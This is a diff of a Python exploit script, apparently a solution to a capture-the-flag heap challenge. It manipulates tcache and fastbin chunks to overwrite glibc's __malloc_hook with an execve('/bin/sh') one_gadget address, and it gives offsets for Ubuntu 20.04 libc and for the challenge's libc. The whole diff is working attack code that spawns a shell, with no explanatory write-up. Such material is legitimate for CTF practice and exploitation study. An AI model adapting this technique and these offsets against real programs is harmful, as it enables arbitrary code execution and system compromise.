@@ -105,20 +105,21 @@ def exploit():
     print("fake chunk addr:\t" + hex(fake_chunk_addr))
     edit(1, fake_chunk_addr.to_bytes(7,"little"))
 
-    # empty tcache
+    # empty tcache and the first chunk in fastbins, priming the next malloc call to return the faked chunk 
     alloc_tcache()
-    
-    # alloc 2 0x70 chunks from tcache to get the second chunk within the main arena
-    # send in rop chain, overwriting __malloc_hook
     add(5, 0x60, 'E' * 0x60)
-
+    
+    # overwrite __malloc_hook
     # local libc gadgets
     # execve_binsh = 0xcbd1a +  libc_base_addr
     # bin_sh_addr  = 0x18a152 + libc_base_addr
     # pop_r12_ret  = 0x26e9a +  libc_base_addr
     
-    # ununtu libc.so.6
+    # ununtu 20.04 libc.so.6
     execve_binsh = 0xe6c81 + libc_base_addr # requires [r15] and [rbx] are null
+
+    # challenge libc.so.6
+    # execve_binsh = 0xdf54f + libc_base_addr # requires [r15] and [rbx] are null
 
     p.send(b'1\n' + str(6).encode('utf-8') + b'\n' + str(0x60).encode('utf-8') + b'\n' + \
         b'A' * 0x23 + p64(execve_binsh) + b'\n')
